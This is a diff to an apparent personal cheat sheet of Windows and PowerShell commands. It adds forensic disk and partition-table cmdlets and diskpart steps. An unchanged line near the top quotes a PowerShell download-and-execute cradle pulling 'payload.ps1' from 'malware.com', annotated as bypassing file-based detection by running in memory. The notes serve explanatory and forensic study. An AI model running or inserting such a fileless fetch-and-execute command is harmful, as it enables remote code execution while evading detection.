@@ -5,7 +5,7 @@ Check network adapters
 Bypasses file-based detection and executes malicious code directly in memory:
 iex((New-Object Net.WebClient).DownloadString('https://malware.com/payload.ps1'))
 
-date &  time
+date & time
 echo | date >> file.txt
 
 Net Statistics Workstation
@@ -65,3 +65,12 @@ HKLM\Software\WOW6432Node\Microsoft\Windows\CurrrentVersion\Uninstall --> enumer
 chkdsk --> detect errors in file system
 
 Get-ForensicGuidPartitionTable -Path \\.\PHYSICALDRIVE0 --> get GUID Partition Table
+Get-MBR
+Get-ForensicBootSector --> analyzes the hard drive's first sector and determines if the disk is formatted using the MBR or GPT partitioning scheme then parses the GPT
+Get-ForensicPartitionTable --> determines the type of boot sector (MBR or GPT) and returns the correct partition object (PartitionEntry or GuidPartitionTableEntry)
+
+diskpart
+select disk <disk number>
+detail disk
+select partition=1
+detail partition
